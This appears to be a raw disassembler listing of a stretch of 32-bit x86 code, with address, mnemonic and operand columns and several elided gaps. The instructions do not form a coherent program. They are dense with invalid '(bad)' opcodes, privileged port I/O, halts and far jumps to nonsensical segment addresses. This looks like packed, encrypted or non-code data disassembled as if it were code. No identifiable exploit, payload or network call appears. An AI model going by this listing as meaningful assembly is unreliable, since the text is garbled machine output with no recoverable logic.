  41c6a2:	and    eax,0x2b3a4893
  41c6a7:	mov    ecx,esp
  41c6a9:	dec    eax
  41c6aa:	test   DWORD PTR [edi+0x37a46e27],esp
  41c6b0:	push   0x5d
  41c6b2:	dec    ebp
  41c6b3:	push   esi
  41c6b4:	ins    BYTE PTR es:[edi],dx
  41c6b5:	mov    cl,0x1f
  41c6b7:	out    0xd9,al
  41c6b9:	mov    cl,0x9
  41c6bb:	or     ch,BYTE PTR [edx]
  41c6bd:	data16 jecxz 0x41c666
  41c6c0:	in     eax,dx
  41c6c1:	in     al,dx
  41c6c2:	retf   
  41c6c3:	inc    ebp
  41c6c4:	mov    eax,ds:0xdef0d2a
  41c6c9:	dec    esp
  41c6ca:	(bad)  
  41c6cb:	retf   
  41c6cc:	call   DWORD PTR [esi-0x34]
  41c6cf:	inc    ecx
  41c6d0:	push   ds
  41c6d1:	jno    0x41c689
  41c6d3:	xor    dl,bl
  41c6d5:	dec    ebp
  41c6d6:	jp     0x41c66c
  41c6d8:	inc    esi
  41c6d9:	push   edi
  41c6da:	push   ss
  41c6db:	(bad)  
  41c6dc:	sbb    ecx,ebp
  41c6de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6df:	retf   
  41c6e0:	jae    0x41c690
  41c6e2:	pop    esi
  41c6e3:	mov    DWORD PTR [edx+0x3c],ecx
  41c6e6:	leave  
  41c6e7:	div    dh
  41c6e9:	jae    0x41c727
  41c6eb:	push   0xffffffa3
  41c6ed:	cmp    eax,0xa4b05294
  41c6f2:	bound  eax,QWORD PTR [eax]
  41c6f4:	cld    
  41c6f5:	push   ebx
  41c6f6:	jb     0x41c692
  41c6f8:	fidivr DWORD PTR [esi+0x6f]
  41c6fb:	call   0x5a76ca8a
  41c700:	mov    ss,WORD PTR [edx-0x21bbf4bd]
  41c706:	pop    edi
  41c707:	sahf   
  41c708:	outs   dx,BYTE PTR ds:[esi]
  41c709:	push   edx
  41c70a:	popf   
  41c70b:	call   0x72bb:0x6c904a57
  41c712:	jb     0x41c704
  41c714:	shl    DWORD PTR [ebx+0x5f],cl
  41c717:	(bad)  
  41c718:	xchg   ecx,eax
  41c719:	xchg   esi,eax
  41c71a:	sbb    al,0xd2
  41c71c:	add    esp,DWORD PTR [edx+0x1160a1bf]
  41c722:	push   edx
  41c723:	lahf   
  41c724:	jo     0x41c702
  41c726:	test   eax,0xa2afc14b
  41c72b:	jne    0x41c6ef
  41c72d:	loopne 0x41c7a0
  41c72f:	lds    edi,FWORD PTR [esi+0x73ed25aa]
  41c735:	push   edi
  41c736:	jecxz  0x41c739
  41c738:	add    al,0x88
  41c73a:	jo     0x41c724
  41c73c:	rcl    DWORD PTR [esi+0x6f59bc71],1
  41c742:	pop    eax
  41c743:	scas   al,BYTE PTR es:[edi]
  41c744:	push   edx
  41c745:	xchg   ebp,eax
  41c746:	cmp    dl,BYTE PTR [edi+edx*8-0x3a]
  41c74a:	sbb    ebx,DWORD PTR [esi+0x2d]
  41c74d:	add    dh,BYTE PTR ds:0x6da0b90c
  41c753:	xchg   DWORD PTR [eax-0xfd6b711],ecx
  41c759:	sub    DWORD PTR [esi-0x30e230f1],0xd615626d
  41c763:	cdq    
  41c764:	mov    esp,0x4b2b4401
  41c769:	jmp    DWORD PTR [ebx+0x50]
  41c76c:	mov    ebp,0x39
	...
  41c7d5:	add    dl,bl
  41c7d7:	add    edx,eax
  41c7d9:	xchg   bl,bl
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	loope  0x41c7db
  41c7e4:	pushf  
  41c7e5:	stos   BYTE PTR es:[edi],al
  41c7e6:	xor    al,BYTE PTR [bx+di]
  41c7e9:	add    BYTE PTR [eax],al
  41c7eb:	add    DWORD PTR [eax],eax
  41c7ed:	add    BYTE PTR [edi+0x27],bh
  41c7f0:	bsf    ebp,DWORD PTR [esp+edi*4-0x6f]
  41c7f5:	sti    
  41c7f6:	add    BYTE PTR [ecx-0x2],0xca
  41c7fa:	(bad)  
  41c7fb:	mov    edi,0xcbbd2cf9
  41c800:	jno    0x41c844
  41c802:	popa   
  41c803:	mov    esi,DWORD PTR [esi+0x67e48e4e]
  41c809:	leave  
  41c80a:	dec    ecx
  41c80b:	pop    ds
  41c80c:	jns    0x41c7f8
  41c80e:	fiadd  DWORD PTR ds:0x989f0702
  41c814:	std    
  41c815:	mov    ds:0xf0779091,al
  41c81a:	adc    DWORD PTR [edi-0x41],ebx
  41c81d:	xor    BYTE PTR [ebp-0x9d5f9fa],cl
  41c823:	clc    
  41c824:	fistp  DWORD PTR [eax+0x3e]
  41c827:	loop   0x41c7bd
  41c829:	imul   ecx,DWORD PTR [eax+0x1ed87ded],0xf0be47c2
  41c833:	mov    ds:0x9051f45a,eax
  41c838:	mov    al,0x6f
  41c83a:	ret    0xaa1
  41c83d:	fdivr  st,st(5)
  41c83f:	cmp    al,0x8a
  41c841:	mov    edi,DWORD PTR [edi]
  41c843:	lock pop ecx
  41c845:	std    
  41c846:	ss mov ch,0xc5
  41c849:	sbb    ch,al
  41c84b:	aas    
  41c84c:	add    DWORD PTR [ecx-0x438f9787],0xffffff8d
  41c853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c854:	mov    ecx,0xbb397108
  41c859:	dec    eax
  41c85a:	adc    ebx,esi
  41c85c:	cmc    
  41c85d:	sbb    DWORD PTR [ecx],0xffffff8f
  41c860:	sub    dl,bh
  41c862:	arpl   WORD PTR [ebx-0x17],cx
  41c865:	test   al,0xe
  41c867:	mov    bh,0xef
  41c869:	mov    DWORD PTR [ebp-0x5a],esp
  41c86c:	bound  ecx,QWORD PTR [ecx]
  41c86e:	ror    BYTE PTR [eiz*1-0x7f82fe71],0xad
  41c876:	paddsb mm1,QWORD PTR [edx-0x726cd3a1]
  41c87d:	les    esi,FWORD PTR [ebx+0x5c6b888]
  41c883:	push   esi
  41c884:	or     bl,cl
  41c886:	and    DWORD PTR [ebp-0x2dedac52],esi
  41c88c:	pop    esi
  41c88d:	call   0x466f:0x1a518f03
  41c894:	fild   DWORD PTR [ebp-0x4f]
  41c897:	aam    0x42
  41c899:	inc    BYTE PTR [edx]
  41c89b:	pop    edi
  41c89c:	push   edx
  41c89d:	jl     0x41c8af
  41c89f:	jmp    0xeb58b305
  41c8a4:	mov    bh,0x25
  41c8a6:	xchg   ebp,eax
  41c8a7:	mov    DWORD PTR [ebx],edi
  41c8a9:	or     al,0xb8
  41c8ab:	xor    edx,DWORD PTR [ecx]
  41c8ad:	sbb    BYTE PTR [edi+eiz*8],dh
  41c8b0:	and    eax,0x9983f12d
  41c8b5:	sub    ebx,edi
  41c8b7:	fcmovbe st,st(7)
  41c8b9:	push   ss
  41c8ba:	xchg   edx,eax
  41c8bb:	mov    dl,0x58
  41c8bd:	mov    ds:0x84cdc388,eax
  41c8c2:	push   0x2684e83c
  41c8c7:	mov    fs,WORD PTR [ebp-0x33cc95c6]
  41c8cd:	sbb    bh,dh
  41c8cf:	imul   edi,edi,0xa4deb80e
  41c8d5:	push   0xffffffa4
  41c8d7:	or     DWORD PTR [ecx-0x74],ebx
  41c8da:	push   esi
  41c8db:	push   esp
  41c8dc:	lock sbb al,0x3f
  41c8df:	sahf   
  41c8e0:	and    eax,0xa3d693a5
  41c8e5:	hlt    
  41c8e6:	hlt    
  41c8e7:	jmp    0xc2dc4302
  41c8ec:	icebp  
  41c8ed:	pop    ss
	...
  41c956:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c95d:	ja     0x41c977
  41c95f:	sub    DWORD PTR [ebx],edi
  41c961:	add    DWORD PTR [eax+0x6730400b],edx
  41c967:	xor    eax,DWORD PTR [ecx]
  41c969:	add    BYTE PTR [eax],al
  41c96b:	add    DWORD PTR [eax],eax
  41c96d:	add    BYTE PTR [ecx+edx*4-0x60],bh
  41c971:	xchg   ecx,eax
  41c972:	mov    edi,0xbfc9344a
  41c977:	fldcw  WORD PTR [esi-0x44c7ec95]
  41c97d:	pop    eax
  41c97e:	sub    DWORD PTR [eax+0x455a30cd],edx
  41c984:	cmp    al,0x7a
  41c986:	addr16 inc esp
  41c988:	xchg   ecx,eax
  41c989:	lods   al,BYTE PTR ds:[esi]
  41c98b:	mov    dh,0x5e
  41c98d:	scas   eax,DWORD PTR es:[edi]
  41c98e:	fld    QWORD PTR [edi+ecx*2-0x27]
  41c992:	ins    DWORD PTR es:[edi],dx
  41c993:	mov    ds:0xa528fc06,al
  41c998:	xchg   edx,eax
  41c999:	jle    0x41c944
  41c99b:	jmp    0x41c9d9
  41c99d:	sub    edi,ebx
  41c99f:	mov    esp,0xf0e4b45f
  41c9a4:	mov    ebx,0x5197440c
  41c9a9:	sub    BYTE PTR [ecx+0x4d0e99],bl
  41c9af:	pop    edx
  41c9b0:	outs   dx,BYTE PTR ds:[esi]
  41c9b1:	retf   
  41c9b2:	outs   dx,DWORD PTR ds:[esi]
  41c9b3:	inc    esp
  41c9b4:	pop    es
  41c9b5:	push   edx
  41c9b6:	test   BYTE PTR [esi+0x25fc8caf],ah
  41c9bc:	or     eax,0xb5cd5034
  41c9c1:	adc    eax,0xa320630e
  41c9c6:	inc    eax
  41c9c7:	pop    ds
  41c9c8:	mov    eax,0x47bd3637
  41c9cd:	push   ebp
  41c9ce:	cmc    
  41c9cf:	lock scas al,BYTE PTR es:[edi]
  41c9d1:	fnstenv [edx+0x37995ec3]
  41c9d7:	xchg   ebx,eax
  41c9d8:	sahf   
  41c9d9:	outs   dx,BYTE PTR ds:[esi]
  41c9da:	and    bh,bh
  41c9dc:	inc    eax
  41c9dd:	jae    0x41c9aa
  41c9df:	mov    dh,0x67
  41c9e1:	mov    ah,0xf
  41c9e3:	out    0x9c,al
  41c9e5:	inc    eax
  41c9e6:	push   0x27230f1f
  41c9eb:	push   ds
  41c9ec:	push   ebp
  41c9ed:	fist   DWORD PTR [ecx]
  41c9ef:	loopne 0x41ca3a
  41c9f1:	xor    eax,0x959ff363
  41c9f6:	xchg   esi,eax
  41c9f7:	push   edi
  41c9f8:	xor    DWORD PTR [ecx+ebx*2],0xed97079
  41c9ff:	mov    al,ds:0x1531997
  41ca04:	mov    dh,0x42
  41ca06:	pop    ss
  41ca07:	mov    edi,0xdd92d5a3
  41ca0c:	test   DWORD PTR [ecx-0x2f],0x73ea36
  41ca13:	xor    ah,BYTE PTR [ebx+0x48]
  41ca16:	pop    eax
  41ca17:	hlt    
  41ca18:	mov    eax,ds:0xbcc4c0cd
  41ca1d:	dec    edi
  41ca1e:	mov    ch,0x53
  41ca20:	stc    
  41ca21:	cli    
  41ca22:	cs mov ebp,0xa15c3d0d
  41ca28:	xor    DWORD PTR [edi],edx
  41ca2a:	out    dx,eax
  41ca2b:	xor    DWORD PTR [esi-0x7b],edx
  41ca2e:	test   DWORD PTR [eax-0x53],ebp
  41ca31:	out    0x3,eax
  41ca33:	mov    esi,0x7b91493d
  41ca38:	sbb    DWORD PTR [esi],edi
  41ca3a:	div    BYTE PTR [esp+edx*2+0x12aef647]
  41ca41:	add    ebp,DWORD PTR [ebx]
  41ca43:	(bad)  
  41ca45:	xor    eax,edi
  41ca47:	sbb    BYTE PTR [edx],bl
  41ca49:	js     0x41ca55
  41ca4b:	enter  0xdc58,0x2a
  41ca4f:	xchg   esp,eax
  41ca50:	hlt    
  41ca51:	pop    edx
  41ca52:	inc    esp
  41ca53:	pop    eax
  41ca54:	xor    BYTE PTR ds:[edi-0x142dde82],bh
  41ca5b:	sbb    BYTE PTR [edx-0x2d],bh
  41ca5e:	push   eax
  41ca5f:	cmp    DWORD PTR [edi-0x4a],edx
  41ca62:	add    DWORD PTR [eax-0x4e],ebx
  41ca65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca66:	arpl   WORD PTR [edi],ax
  41ca68:	cmp    al,0x69
  41ca6a:	mov    dl,0xa1
  41ca6c:	jo     0x41caa2
	...
  41cad6:	lock retf 0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	jae    0x41cac9
  41cae4:	jnp    0x41cb38
  41cae6:	addr16 xor al,0x1
  41cae9:	add    BYTE PTR [eax],al
  41caeb:	add    DWORD PTR [eax],eax
  41caed:	add    dl,dl
  41caef:	lock pop edx
  41caf1:	mov    cs,WORD PTR [edi-0x73]
  41caf4:	mov    eax,ds:0xc92c202a
  41caf9:	(bad)  
  41cafa:	arpl   WORD PTR [eax-0x7e9f31a0],ax
  41cb00:	mov    ds:0xa5ae48ae,al
  41cb05:	dec    ebp
  41cb06:	push   edx
  41cb07:	cmp    BYTE PTR [ecx+0x74],dh
  41cb0a:	ret    
  41cb0b:	inc    ecx
  41cb0c:	ret    
  41cb0d:	sub    esp,DWORD PTR [ebp+0x6f46ea2c]
  41cb13:	mov    bh,0x78
  41cb15:	inc    esi
  41cb16:	dec    edi
  41cb17:	add    esp,DWORD PTR [ebx+eiz*1+0x7b663ef0]
  41cb1e:	ret    
  41cb1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb20:	mov    dl,0x84
  41cb22:	cmc    
  41cb23:	xor    al,0xaa
  41cb25:	in     eax,0xfd
  41cb27:	xcrypt-ofb (bad)
  41cb28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb29:	outs   dx,DWORD PTR ds:[esi]
  41cb2a:	jb     0x41cb5b
  41cb2c:	call   0x7e50e1b7
  41cb31:	mov    ebp,cs
  41cb33:	sbb    esp,DWORD PTR es:[eax-0x7abb1707]
  41cb3a:	arpl   WORD PTR [ebx+0x1dccb460],cx
  41cb40:	js     0x41cb42
  41cb42:	cli    
  41cb43:	inc    ebp
  41cb44:	dec    ebp
  41cb45:	fcom   DWORD PTR [eax]
  41cb47:	jo     0x41cb78
  41cb49:	fdiv   QWORD PTR [ecx+eax*8+0x2e]
  41cb4d:	inc    esi
  41cb4e:	mov    ds:0x4a5106de,al
  41cb53:	xchg   ecx,eax
  41cb54:	ret    
  41cb55:	in     al,dx
  41cb56:	jmp    0x13f:0x62098f05
  41cb5d:	xor    BYTE PTR [eax+ebp*8-0x32],bh
  41cb61:	jno    0x41cb4d
  41cb63:	or     dl,BYTE PTR [eax-0x50]
  41cb66:	xor    ch,dh
  41cb68:	and    DWORD PTR [esi+edx*1+0x1de047e2],ebp
  41cb6f:	xlat   BYTE PTR ds:[ebx]
  41cb70:	shl    BYTE PTR [ecx-0x4afcb05d],1
  41cb76:	(bad)  
  41cb78:	inc    esi
  41cb79:	daa    
  41cb7a:	mov    edx,0x246993bd
  41cb7f:	rcr    ch,0x33
  41cb82:	mov    ch,0x50
  41cb84:	ins    BYTE PTR es:[edi],dx
  41cb85:	or     DWORD PTR [eax],0x45
  41cb88:	cmc    
  41cb89:	out    0xca,eax
  41cb8b:	xchg   ebx,edi
  41cb8d:	pop    es
  41cb8e:	add    BYTE PTR es:[ebp+0x5b],dh
  41cb92:	sbb    al,0x94
  41cb94:	or     DWORD PTR [ebp-0x26abd76a],eax
  41cb9a:	scas   eax,DWORD PTR es:[edi]
  41cb9b:	repz pusha 
  41cb9d:	mov    WORD PTR [edx-0x453c2bde],?
  41cba3:	in     al,dx
  41cba4:	sub    BYTE PTR [edx+ebx*4+0x40],cl
  41cba8:	pop    esp
  41cba9:	std    
  41cbaa:	scas   al,BYTE PTR es:[edi]
  41cbab:	out    0xa2,al
  41cbad:	inc    esp
  41cbae:	lods   al,BYTE PTR ds:[esi]
  41cbaf:	adc    di,ax
  41cbb2:	push   eax
  41cbb3:	push   esi
  41cbb4:	sub    eax,0xb32e3c6a
  41cbb9:	scas   al,BYTE PTR es:[edi]
  41cbba:	test   eax,0x9888099d
  41cbbf:	push   esp
  41cbc0:	pop    esi
  41cbc1:	mov    BYTE PTR [eax-0x1be6c87a],ch
  41cbc7:	pop    eax
  41cbc8:	(bad)  
  41cbc9:	neg    eax
  41cbcb:	fadd   st(1),st
  41cbcd:	and    edx,edx
  41cbcf:	jae    0x41cbd3
  41cbd1:	out    0x6,al
  41cbd3:	dec    ah
  41cbd5:	mov    al,ds:0xed449cb0
  41cbda:	inc    edx
  41cbdb:	pop    es
  41cbdc:	rol    DWORD PTR [esi+0x7e],1
  41cbdf:	(bad)  
  41cbe0:	adc    al,0x66
  41cbe2:	mov    dl,0xf2
  41cbe4:	inc    ebp
  41cbe5:	lods   al,BYTE PTR ds:[esi]
  41cbe6:	sahf   
  41cbe7:	jge    0x41cc3f
  41cbe9:	cli    
  41cbea:	lea    eax,[ecx]
  41cbec:	sbb    DWORD PTR [eax+eax*1],esi
	...
  41cc53:	add    BYTE PTR [eax],al
  41cc55:	add    BYTE PTR [ecx],ch
  41cc57:	(bad)  
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0x685ff322
  41cc65:	adc    eax,0x13567
  41cc6a:	add    BYTE PTR [ecx],al
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	and    DWORD PTR [ebp-0x3c],esp
  41cc71:	lea    ecx,[ecx+edx*8]
  41cc74:	push   edi
  41cc76:	push   eax
  41cc77:	test   dh,0xcf
  41cc7a:	mov    al,0xcc
  41cc7c:	and    al,BYTE PTR [edi]
  41cc7e:	mov    esp,DWORD PTR [esi]
  41cc80:	and    DWORD PTR [edx],ecx
  41cc82:	into   
  41cc83:	adc    dh,bl
  41cc85:	add    BYTE PTR ds:0x5c8dd357,bl
  41cc8b:	adc    esp,ebp
  41cc8d:	iret   
  41cc8e:	dec    ecx
  41cc8f:	retf   
  41cc90:	inc    esi
  41cc91:	out    dx,eax
  41cc92:	mov    BYTE PTR [esi+0x39],ah
  41cc95:	fisttp QWORD PTR [esi+ebp*8]
  41cc98:	enter  0xa90c,0xaa
  41cc9c:	dec    edx
  41cc9d:	xchg   edx,eax
  41cc9e:	pop    esp
  41cc9f:	sbb    esi,DWORD PTR [eax]
  41cca1:	or     DWORD PTR [ebx],0x14
  41cca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cca5:	in     eax,0xc4
  41cca7:	xchg   edi,eax
  41cca8:	push   edx
  41cca9:	and    DWORD PTR [eax-0xbd3f848],ebp
  41ccaf:	cwde   
  41ccb0:	jle    0x41ccd3
  41ccb2:	icebp  
  41ccb3:	sub    eax,0x39f6d147
  41ccb8:	shr    dh,cl
  41ccba:	ret    0x8fef
  41ccbd:	(bad)  
  41ccbe:	mov    esp,DWORD PTR [edx+0x34b49764]
  41ccc4:	inc    edi
  41ccc5:	(bad)  
  41ccc6:	dec    eax
  41ccc7:	fldenv [ebp+0x4dceb024]
  41cccd:	push   ebx
  41ccce:	loop   0x41cd2d
  41ccd0:	sub    ebp,DWORD PTR [edi+0x55]
  41ccd3:	add    al,0x53
  41ccd5:	push   edx
  41ccd6:	popf   
  41ccd7:	xor    al,ch
  41ccd9:	stos   DWORD PTR es:[di],eax
  41ccdb:	aad    0xd2
  41ccdd:	outs   dx,BYTE PTR ds:[esi]
  41ccde:	out    0xab,eax
  41cce0:	mov    BYTE PTR [edx+0x705ee5f],cl
  41cce6:	je     0x41cd08
  41cce8:	test   BYTE PTR [ebx+0x68452673],ch
  41ccee:	lock push eax
  41ccf0:	or     al,0x29
  41ccf2:	or     al,0xc2
  41ccf4:	or     DWORD PTR [edx],ebx
  41ccf6:	mov    BYTE PTR [eax],bh
  41ccf8:	ds scas eax,DWORD PTR es:[edi]
  41ccfa:	fdiv   QWORD PTR [ecx-0x7f]
  41ccfd:	aaa    
  41ccfe:	dec    ebp
  41ccff:	loop   0x41cd4d
  41cd01:	xchg   esi,eax
  41cd02:	xlat   BYTE PTR ds:[ebx]
  41cd03:	repz cmp bh,dl
  41cd06:	xchg   ecx,eax
  41cd07:	ja     0x41ccfa
  41cd09:	loopne 0x41ccc4
  41cd0b:	sub    ch,BYTE PTR ds:0xc8d5239c
  41cd11:	xchg   ecx,eax
  41cd12:	push   es
  41cd13:	cmp    DWORD PTR [edi],0x63e4c1c8
  41cd19:	mov    ?,WORD PTR [eax-0x4e]
  41cd1c:	popf   
  41cd1d:	out    0x79,eax
  41cd1f:	fsub   st(7),st
  41cd21:	(bad)  
  41cd23:	outs   dx,BYTE PTR ds:[esi]
  41cd24:	cdq    
  41cd25:	adc    DWORD PTR [ebp+0x52],ebp
  41cd28:	fiadd  DWORD PTR [edx-0x2e4579c8]
  41cd2e:	ja     0x41cd52
  41cd30:	mov    WORD PTR ds:0xf429b334,ds
  41cd36:	jecxz  0x41ccbc
  41cd38:	sbb    ebp,edx
  41cd3a:	call   0x6e8c:0xc1a1613d
  41cd41:	mov    al,ds:0x949ac078
  41cd46:	into   
  41cd47:	fs sbb eax,0x39976a2b
  41cd4d:	jl     0x41cd5f
  41cd4f:	or     BYTE PTR [eax+0x24],al
  41cd52:	inc    edi
  41cd53:	jne    0x41cd58
  41cd55:	das    
  41cd56:	rcl    DWORD PTR [edi+0x7b0c7869],0x3
  41cd5d:	xchg   ecx,eax
  41cd5e:	mul    DWORD PTR [edi+eiz*1+0x48147ebf]
  41cd65:	les    esi,FWORD PTR ds:0x5ec76ea6
  41cd6b:	jp     0x41ccf1
  41cd6d:	push   ds
	...
  41cdd6:	pusha  
  41cdd7:	cdq    
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	pop    esp
  41cde3:	mov    esp,0x36673135
  41cde8:	add    DWORD PTR [eax],eax
  41cdea:	add    BYTE PTR [ecx],al
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	lea    edx,[ecx]
  41cdf0:	not    esp
  41cdf2:	xchg   DWORD PTR [edx],ebx
  41cdf4:	add    al,0x7e
  41cdf6:	and    al,0xef
  41cdf8:	sbb    al,0x85
  41cdfa:	ins    BYTE PTR es:[edi],dx
  41cdfb:	inc    ebx
  41cdfc:	test   DWORD PTR [edi-0x69],0xb3f7a7a8
  41ce03:	ins    DWORD PTR es:[edi],dx
  41ce04:	out    0x66,al
  41ce06:	cmp    ebp,DWORD PTR [esi+0xb]
  41ce09:	adc    BYTE PTR [eax],bl
  41ce0b:	je     0x41ce15
  41ce0d:	jle    0x41cdd3
  41ce0f:	leave  
  41ce10:	adc    eax,0x170a0688
  41ce15:	sub    BYTE PTR [ebx+0x7b],ah
  41ce18:	adc    eax,0xb429b9d0
  41ce1d:	mov    esp,0x10f262e1
  41ce22:	adc    BYTE PTR [eax-0x5d],ch
  41ce25:	jle    0x41cde1
  41ce27:	sbb    BYTE PTR [ebp-0x7ff74121],0x67
  41ce2e:	inc    ecx
  41ce2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce30:	mov    dh,0x20
  41ce32:	mov    al,0x4a
  41ce34:	lock pop ebp
  41ce36:	mov    cl,0xc7
  41ce38:	cmp    ecx,DWORD PTR [esi-0x61]
  41ce3b:	jecxz  0x41cdfa
  41ce3d:	inc    esi
  41ce3e:	xchg   ecx,eax
  41ce3f:	inc    esi
  41ce40:	(bad)  
  41ce41:	jne    0x41ce7a
  41ce43:	jne    0x41ceaa
  41ce45:	mov    edx,0x5f45d7a3
  41ce4a:	dec    esp
  41ce4b:	ficomp DWORD PTR [eax+0x25]
  41ce4e:	(bad)  
  41ce4f:	sub    esi,DWORD PTR gs:[edi]
  41ce52:	popf   
  41ce53:	sbb    eax,0x7fa0b3bb
  41ce58:	or     eax,0xe5132ada
  41ce5d:	nop
  41ce5e:	jmp    0x41ce5b
  41ce60:	in     eax,dx
  41ce61:	mov    dl,0xa9
  41ce63:	in     eax,0x91
  41ce65:	jb     0x41cdf6
  41ce67:	lahf   
  41ce68:	repnz shr cl,0xa1
  41ce6c:	sahf   
  41ce6d:	ret    0x9c9f
  41ce70:	or     esp,esi
  41ce72:	jp     0x41ce6b
  41ce74:	jbe    0x41ce58
  41ce76:	sbb    BYTE PTR [eax+0x52],dh
  41ce79:	daa    
  41ce7a:	add    BYTE PTR [ecx-0x41a76861],bl
  41ce80:	inc    esi
  41ce81:	jle    0x41ceb9
  41ce83:	push   0x1b
  41ce85:	pop    ds
  41ce86:	popa   
  41ce87:	pop    edx
  41ce88:	sub    esi,DWORD PTR [eax+ebp*8]
  41ce8b:	jnp    0x41ce2f
  41ce8d:	das    
  41ce8e:	inc    ebp
  41ce8f:	add    edi,DWORD PTR [edi]
  41ce91:	int    0x6c
  41ce93:	jl     0x41cecc
  41ce95:	pop    edi
  41ce96:	jo     0x41ceaa
  41ce98:	std    
  41ce99:	out    dx,al
  41ce9a:	sub    DWORD PTR [edx+ecx*1-0x13],ecx
  41ce9e:	inc    eax
  41ce9f:	add    al,0x7e
  41cea1:	sub    BYTE PTR [ebx+esi*8+0x37f2d3d9],bl
  41cea8:	test   al,0x66
  41ceaa:	mov    eax,0xf6f9efcf
  41ceaf:	jmp    0xea73:0xe8225b2b
  41ceb6:	outs   dx,DWORD PTR ds:[esi]
  41ceb7:	nop
  41ceb8:	sub    BYTE PTR [ebx+ebp*1-0x22],ah
  41cebc:	lea    ebx,[ebx-0x3119d665]
  41cec2:	outs   dx,BYTE PTR ds:[esi]
  41cec3:	cld    
  41cec4:	mov    dl,0xd7
  41cec6:	xchg   edi,eax
  41cec7:	add    al,ch
  41cec9:	add    BYTE PTR [edi-0x1d],dh
  41cecc:	std    
  41cecd:	xchg   ecx,eax
  41cece:	or     DWORD PTR [edi-0x5],edx
  41ced1:	das    
  41ced2:	mov    eax,0x2ebaf327
  41ced7:	dec    eax
  41ced8:	fadd   QWORD PTR [ebp+0x31b034b6]
  41cede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cedf:	pop    esp
  41cee0:	repz push 0x51
  41cee3:	adc    DWORD PTR [esi-0x63],ecx
  41cee6:	fcmovnu st,st(0)
  41cee8:	daa    
  41cee9:	mov    al,ds:0x9b2b9f59
	...
  41cf56:	pop    es
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	in     eax,dx
  41cf63:	push   ecx
  41cf64:	test   eax,0x1376759
  41cf69:	add    BYTE PTR [eax],al
  41cf6b:	add    DWORD PTR [eax],eax
  41cf6d:	add    BYTE PTR [ebx-0x57],ah
  41cf70:	pop    ds
  41cf71:	cld    
  41cf72:	push   ecx
  41cf73:	mov    eax,ds:0x5f0c4ad2
  41cf78:	into   
  41cf79:	cmp    eax,0xe62b3602
  41cf7e:	dec    ebx
  41cf7f:	mov    esi,0xc3d498d7
  41cf84:	inc    esp
  41cf85:	add    eax,0xbeaa143a
  41cf8a:	test   eax,0x32cda5a7
  41cf8f:	loope  0x41cf65
  41cf91:	out    dx,eax
  41cf92:	sahf   
  41cf93:	pop    edx
  41cf94:	push   esp
  41cf95:	pushf  
  41cf96:	stc    
  41cf97:	jno    0x41cf4c
  41cf99:	mov    cs,WORD PTR [edx+0x61]
  41cf9c:	js     0x41cf7d
  41cf9e:	cdq    
  41cf9f:	jecxz  0x41cf32
  41cfa1:	out    0xea,al
  41cfa3:	pop    ds
  41cfa4:	xor    DWORD PTR [ebp+0xb5c1ccc],ebx
  41cfaa:	sub    BYTE PTR [edx+eax*8-0x68e895db],bl
  41cfb1:	pop    edi
  41cfb2:	loop   0x41cf82
  41cfb4:	push   ebx
  41cfb5:	and    ebp,DWORD PTR [esp+eiz*4+0x7]
  41cfb9:	sub    dl,BYTE PTR [edi]
  41cfbb:	sub    bl,dl
  41cfbd:	pop    eax
  41cfbe:	or     eax,0x4208c1e1
  41cfc3:	bound  ebx,QWORD PTR [ebx+0x78d54fec]
  41cfc9:	test   dl,bh
  41cfcb:	loope  0x41cf63
  41cfcd:	sbb    BYTE PTR [ebx+0x77],al
  41cfd0:	mov    al,0xae
  41cfd2:	sub    esp,ecx
  41cfd4:	add    al,0xa
  41cfd6:	daa    
  41cfd7:	je     0x41cfa6
  41cfd9:	out    0xa5,eax
  41cfdb:	test   al,0xdf
  41cfdd:	enter  0x5776,0xc2
  41cfe1:	inc    ebx
  41cfe2:	dec    eax
  41cfe3:	(bad)  
  41cfe4:	push   esi
  41cfe5:	fadd   DWORD PTR ds:0x877f4f85
  41cfeb:	mov    al,ds:0xdcf6e785
  41cff0:	popa   
  41cff1:	xchg   esi,eax
  41cff2:	add    dh,BYTE PTR [ebx]
  41cff4:	lahf   
  41cff5:	xchg   edi,eax
  41cff6:	gs pop edx
  41cff8:	shl    BYTE PTR [edi-0x23],0x8b
  41cffc:	sbb    edi,DWORD PTR [ebp+0x2f5cd9da]
  41d002:	and    al,0x98
  41d004:	(bad)  
  41d005:	cwde   
  41d006:	iret   
  41d007:	sub    eax,0xfae400a6
  41d00c:	aas    
  41d00d:	inc    edx
  41d00e:	rcr    ah,1
  41d010:	pop    edi
  41d011:	sub    al,0x56
  41d013:	aam    0xd3
  41d015:	xchg   ecx,eax
  41d016:	xchg   DWORD PTR [ecx+eax*1-0x73a6959c],ebp
  41d01d:	jg     0x41d087
  41d01f:	nop
  41d020:	frstor [ecx+0x657dc075]
  41d026:	add    eax,0xf7917b79
  41d02b:	retf   
  41d02c:	fsubr  st(7),st
  41d02e:	push   esi
  41d02f:	mov    edi,0x191e12c7
  41d034:	mov    dl,0x68
  41d036:	fcomip st,st(4)
  41d038:	stos   BYTE PTR es:[edi],al
  41d039:	jmp    0x41d0a9
